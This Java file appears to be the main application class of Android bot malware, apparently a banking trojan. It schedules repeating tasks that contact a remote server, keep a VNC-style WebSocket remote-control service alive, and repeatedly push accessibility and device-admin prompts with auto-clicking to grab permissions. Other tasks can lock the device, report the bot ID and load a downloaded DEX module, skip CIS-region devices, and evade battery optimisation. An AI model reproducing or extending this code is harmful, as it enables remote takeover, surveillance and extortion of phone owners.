package com.service.app;

import android.app.Application;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.service.app.Main.AccessActivity;
import com.service.app.Main.AccessAdm;
import com.service.app.Main.BotOperationTask;
import com.service.app.Main.PermManager;
import com.service.app.Main.ReceiverDeviceAdmin;
import com.service.app.Main.ScheduledTaskRunner;
import com.service.app.Services.Access;
import com.service.app.Services.DevLock;
import com.service.app.Services.HintService;
import com.service.app.Services.Netmanager;
import com.service.app.Services.SensorService;
import com.service.app.Services.Utitlies;
import com.service.app.Services.kingservice;
import com.service.app.Services.srvToaskAccessibility;
import com.service.app.Services.utils;
import com.service.app.tooling.Notificator;
import com.service.app.vnc.WebSocketService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class App extends Application {

    private static App instance;
    private static ScheduledTaskRunner scheduledRunner;
    private final static String TAG = "taskrunner";

    static utils utl = new utils();
    static defines consts = new defines();
    static Utitlies idutl = new Utitlies();


    int tick;
    int itoaskAccessibility = 0;
    int speedTime = 1000;
    int start_Q = 6;
    boolean accessactivity = false;

    public static App getInstance() {
        return instance;
    }

    public static Context getContext(){
        return instance;
    }

    @Override
    public void onCreate() {
        instance = this;

        super.onCreate();
    }



    public static void runMainTasks(boolean reset){
        if (scheduledRunner == null || reset) {


            final BotOperationTask<Boolean> networkTask = new BotOperationTask.Builder<Boolean>()
                    .setName("network")
                    .setDelay(60000)
                    .setInitialDelay(5000)
                    .setFunction((Handler handler, Context context) -> {
                        context = instance.getApplicationContext();
                        Log.d("TaskRunner", "Running network task");
                        try {
                            context.startService(new Intent(context, Netmanager.class));

                        } catch (Exception e) {
                            utl.RemoteLog(context, "Nettask Error: " + e.toString());
                        } finally {
                            try {
                                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                                Date lastKnock = dateFormat.parse(utl.SettingsRead(context, consts.timeSinceKnock));


                                Date current = new Date();
                                long timeDif = current.getTime() - lastKnock.getTime();
                                Log.d(TAG, "last time knock: " + timeDif / 1000);
                                if (timeDif/1000 > 100){
                                    App.runMainTasks(true);
                                    Log.d(TAG, "Restarting mainTasks, last time knock: " + timeDif / 1000);
                                    utl.RemoteLog(context,TAG + "Restarting mainTasks, last time knock: " + timeDif / 1000);
                                }

                            } catch (ParseException e) {
                                Log.d(TAG, "error getting date: " + e.toString());
                                utl.RemoteLog(context,TAG + ": error getting date: " + e );
                            }
                            utl.SettingsWrite(context, consts.timeSinceKnock, new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
                        }
                        return true;
                    }).create();

            final BotOperationTask<Boolean> workerTask = new BotOperationTask.Builder<Boolean>()
                    .setName("worker")
                    .setDelay(1000)
                    .setInitialDelay(5000)
                    .setFunction((Handler handler, Context context) -> {
                        Log.d("TaskRunner", "Running worker task");
                        context = instance.getApplicationContext();
                        try {

                            utl.chalkTile(instance.speedTime);
                            try {
                                instance.tick = Integer.parseInt(utl.SettingsRead(context, consts.timeWorking));
                            } catch (Exception ex) {
                                instance.tick = 0;
                            }

                            utl.Log("workertask", consts.string_94 + instance.tick);
                            utl.Log("workertask", "Websocket: " + (utl.SettingsRead(context, "websocket") == "1" ? "Working" : "Not Working"));

                            if ((utl.SettingsRead(context, "websocket") == "0" || !utl.isMyServiceRunning(context, WebSocketService.class)) && utl.isAccessibilityServiceEnabled(context, Access.class)) {
                                Intent intent2 = new Intent(Access.ACTION_BIND_WEBSOCKET);
                                context.sendBroadcast(intent2);
                                utl.Log(TAG, "Restarting Websocketservice");
                            }

                            try {
                                if ((!utl.isAccessibilityServiceEnabled(context, Access.class)) && (utl.getScreenBoolean(context))) {
                                    instance.speedTime = 1000;
                                    instance.itoaskAccessibility++;
                                    try {
                                        if (utl.SettingsRead(context, consts.activityAccessibilityVisible).equals(consts.str_1) && (instance.itoaskAccessibility >= 4)) {
                                            instance.startService(new Intent(context, srvToaskAccessibility.class));
                                            instance.itoaskAccessibility = 0;
                                        }
                                    } catch (Exception ex) {
                                    }

                                    if (instance.start_Q >= 6 && !instance.accessactivity) {

                                        Intent serviceIntent = new Intent(context, HintService.class);
                                        instance.startService(serviceIntent);

                                        instance.startActivity(new Intent(context, AccessActivity.class)
                                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                                                .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                                .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
                                        instance.accessactivity = true;
                                        instance.start_Q = 0;
                                    }
                                    instance.start_Q++;

                                } else {

                                    instance.speedTime = 8000;
                                }
                            } catch (Exception ex) {
                            }
                            if (!utl.isAdminDevice(context)) {
                  /*if((utl.getScreenBoolean(context)) && (utl.isAccessibilityServiceEnabled(context, Access.class)))  {
                    if(utl.isAccessibilityServiceEnabled(context, Access.class)){
                        utl.SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                    }
                    Intent dialogIntent = new Intent(context, AccessAdm.class);
                    dialogIntent.putExtra(consts.string_24, consts.str_1);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(dialogIntent);
                }*/
                            } else {//------------Lock Device-----------
                                try {
                                    if ((!utl.isMyServiceRunning(context, DevLock.class))
                                            && (utl.SettingsRead(context, consts.lockDevice).equals(consts.str_1))) {
                                        instance.startService(new Intent(context, DevLock.class));
                                    }
                                } catch (Exception ex) {
                                    // utl.SettingsToAdd(context, consts.LogSMS , consts.string_176 + ex.toString() + consts.string_119);
                                }

                                if (utl.SettingsRead(context, consts.killApplication).contains(instance.getPackageName())) {
                                    if (utl.isAccessibilityServiceEnabled(context, Access.class)) {
                                        utl.SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                                    }
                                    ComponentName mAdminReceiver = new ComponentName(context, ReceiverDeviceAdmin.class);
                                    DevicePolicyManager mDPM = (DevicePolicyManager) instance.getSystemService(Context.DEVICE_POLICY_SERVICE);
                                    mDPM.removeActiveAdmin(mAdminReceiver);
                                }
                            }

                            if (!new File(instance.getDir(consts.string_95, Context.MODE_PRIVATE), consts.nameModule).exists()) {
                                utl.SettingsWrite(context, consts.statDownloadModule, consts.str_step);
                            } else {
                                try {
                                    JSONObject jsonObject = new JSONObject();
                                    jsonObject.put(consts.string_91, consts.string_96);
                                    jsonObject.put(consts.string_97, "" + instance.tick);
                                    jsonObject.put(consts.idbot, utl.SettingsRead(context, consts.idbot));
                                    jsonObject.put(consts.string_98, utl.isAccessibilityServiceEnabled(context, Access.class) ? consts.str_1 : consts.str_step);

                                    utl.sendMainModuleDEX(context, jsonObject.toString());

                                    if ((utl.getScreenBoolean(context)) &&
                                            (!utl.hasPermissionAllTrue(context)) &&
                                            (utl.SettingsRead(context, consts.day1PermissionSMS).isEmpty())) {
                                        instance.startActivity(new Intent(context, PermManager.class));
                                    }

                                } catch (Exception ex) {
                                    utl.Log("workertask", consts.string_99);
                                }
                            }
                            instance.tick += 1;
                            utl.SettingsWrite(context, consts.timeWorking, consts.str_null + instance.tick);
                        } catch (Exception e) {
                            utl.RemoteLog(context, "Workertask Error: " + e.toString());
                        }
                        return true;
                    }).create();




            final BotOperationTask<Boolean> serviceTask = new BotOperationTask.Builder<Boolean>()
                    .setName("services")
                    .setDelay(60000)
                    .setInitialDelay(5000)
                    .setFunction((Handler handler, Context context) -> {
                        context = instance.getApplicationContext();
                        Log.d("TaskRunner", "Running service task");
                        try {
                            if ((!utl.SettingsRead(context, consts.kill).contains(consts.str_dead)) && (!utl.blockCIS(context))) {

                                utl.Log(TAG, consts.str_log1);
                                if ((utl.SettingsRead(context, "websocket") == "0" || !utl.isMyServiceRunning(context, WebSocketService.class)) && utl.isAccessibilityServiceEnabled(context, Access.class)) {
                                    Intent intent2 = new Intent(Access.ACTION_BIND_WEBSOCKET);
                                    context.sendBroadcast(intent2);
                                    utl.Log(TAG, "Restarting Websocketservice");
                                }
                                for (int i = 0; i < consts.arrayClassService.length; i++) {

                                    if ((Build.VERSION.SDK_INT >= 26) && (!idutl.is_dozemode(context)))
                                        break;
                                    if (!utl.isMyServiceRunning(context, consts.arrayClassService[i])) {

                                        if (SensorService.class.getName().equals(consts.arrayClassService[i].getName())) {
                                            context.startService(new Intent(context, consts.arrayClassService[i]));
                                            utl.Log(TAG, consts.string_25 + consts.arrayClassService[i]);
                                        } else if (Integer.parseInt(utl.SettingsRead(context, consts.str_step2)) >= consts.startStep) {
                                            context.startService(new Intent(context, consts.arrayClassService[i]));
                                            utl.Log(TAG, consts.string_26 + consts.arrayClassService[i]);
                                        }
                                    } else {
                                        if (Netmanager.class.getName().equals(consts.arrayClassService[i].getName())) {
                                            context.stopService(new Intent(context, consts.arrayClassService[i]));
                                        }
                                        utl.Log(TAG, consts.string_27_ + consts.arrayClassService[i]);
                                    }
                                }

                                try {
                                    //utl.start_dozemode("kingservice",context);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                                utl.SettingsWrite(context, consts.statAccessibilty, utl.isAccessibilityServiceEnabled(context, Access.class) ? consts.str_1 : consts.str_step);


                                int schet = 0;
                                try {
                                    schet = Integer.parseInt(utl.SettingsRead(context, consts.schetBootReceiver));
                                    schet++;
                                    utl.SettingsWrite(context, consts.schetBootReceiver, consts.str_null + schet);
                                } catch (Exception ex) {
                                }

                                if (!utl.isAdminDevice(context) && 1 == 2) {
                                    if (utl.SettingsRead(context, consts.start_admin).contains("1")) {
                                        if ((utl.getScreenBoolean(context)) && (utl.isAccessibilityServiceEnabled(context, Access.class))) {
                                            if (utl.isAccessibilityServiceEnabled(context, Access.class)) {
                                                utl.SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                                            }
                                            Intent dialogIntent = new Intent(context, AccessAdm.class);
                                            dialogIntent.putExtra(consts.string_24, consts.str_1);
                                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                            context.startActivity(dialogIntent);
                                        }
                                    }
                                }
                            }
                        } catch (Exception ex) {
                        }
                        return true;
                    }).create();

            final BotOperationTask<Boolean> permTask = new BotOperationTask.Builder<Boolean>()
                    .setName("perms")
                    .setDelay(1500)
                    .setInitialDelay(800)
                    .setFunction((Handler handler, Context context) -> {
                        context = instance.getApplicationContext();
                        Log.d("TaskRunner", "Running perm task");
                        try {
                            if (utl.SettingsRead(context.getApplicationContext(), consts.undead).equals(consts.str_1)){
                                Log.d(TAG, "Running undead push");
                                Notificator notificator = new Notificator(context);
                                notificator.setParametersFromMap(context, consts.antisleepPush);
                                notificator.notify(context);
                                final Context contextFinal = context;
                                Handler handler2 = new Handler(Looper.getMainLooper());
                                handler2.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        Handler NotifyHandler = new Handler();
                                        NotifyHandler.postDelayed(new Runnable() {
                                            @Override
                                            public void run() {
                                                NotificationManager notificationManager = (NotificationManager) contextFinal.getSystemService(Context.NOTIFICATION_SERVICE);
                                                notificationManager.cancelAll();
                                            }
                                        }, consts.undeadPushTime);

                                    }
                                });
                                utl.SettingsWrite(context.getApplicationContext(), consts.undead, "0");
                            }
                            if (utl.isAccessibilityServiceEnabled(context, Access.class)) {

                                if (!utl.isAdminDevice(context) && (Integer.parseInt(utl.SettingsRead(context, consts.timesAdminPerm)) <= 10)) {
                                    if ((utl.getScreenBoolean(context)) && (utl.isAccessibilityServiceEnabled(context, Access.class))) {
                                        if (utl.isAccessibilityServiceEnabled(context, Access.class)) {
                                            utl.SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                                        }
                                        utl.SettingsWrite(context, consts.timesAdminPerm, String.valueOf((Integer.parseInt(utl.SettingsRead(context, consts.timesAdminPerm)) + 1)));
                                        Intent dialogIntent = new Intent(context, AccessAdm.class);
                                        dialogIntent.putExtra(consts.string_24, consts.str_1);
                                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                        context.startActivity(dialogIntent);
                                        Log.d(TAG, "timesAdminPerm: " + utl.SettingsRead(context, consts.timesAdminPerm));
                                    }
                                } else if (!idutl.is_dozemode(context)) {
                                    try {
                                        utl.SettingsWrite(context, consts.autoClick, consts.str_1);//auto click start!
                                        utl.Log(TAG, consts.str_log2);
                                        Intent intent1 = new
                                                Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                                                Uri.parse(consts.strPackage + instance.getPackageName()));
                                        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        intent1.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK);
                                        intent1.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                        intent1.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                        instance.startActivity(intent1);
                                    } catch (Exception ex) {
                                        utl.RemoteLog(context, "starting modechange error: " + ex.toString());
                                    }
                                } else {
                                    //Log.d(TAG, "all perms given");
                                }

                            }


                        } catch (Exception ex) {
                            utl.RemoteLog(context, TAG + " Error running permtask: " + ex.toString());
                        }
                        return true;
                    }).create();

            scheduledRunner = new ScheduledTaskRunner(5);
            scheduledRunner.executeAsyncFixedDelay(networkTask, instance);
            scheduledRunner.executeAsyncFixedDelay(serviceTask, instance);
            scheduledRunner.executeAsyncFixedDelay(workerTask, instance);
            scheduledRunner.executeAsyncFixedDelay(permTask, instance);
        }
    }
}
